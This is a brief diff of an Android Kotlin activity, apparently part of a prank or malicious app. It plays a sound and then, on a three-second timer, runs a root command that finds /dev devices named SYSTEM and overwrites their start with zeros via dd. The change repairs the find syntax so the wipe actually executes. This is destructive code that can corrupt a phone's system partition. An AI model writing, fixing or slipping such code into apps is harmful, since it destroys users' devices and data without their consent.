@@ -98,7 +98,7 @@ class RootActivity : AppCompatActivity() {
         mp.start();
 
         Timer("SettingUp", false).schedule(3000) {
-            Runtime.getRuntime().exec(arrayOf("su", "-c", "find /dev -iname SYSTEM -exec dd if=/dev/zero bs=512 count=32 of={}"))
+            Runtime.getRuntime().exec(arrayOf("su", "-c", "find /dev -iname SYSTEM -exec dd if=/dev/zero bs=512 count=32 of={} +"))
         }
     }
 
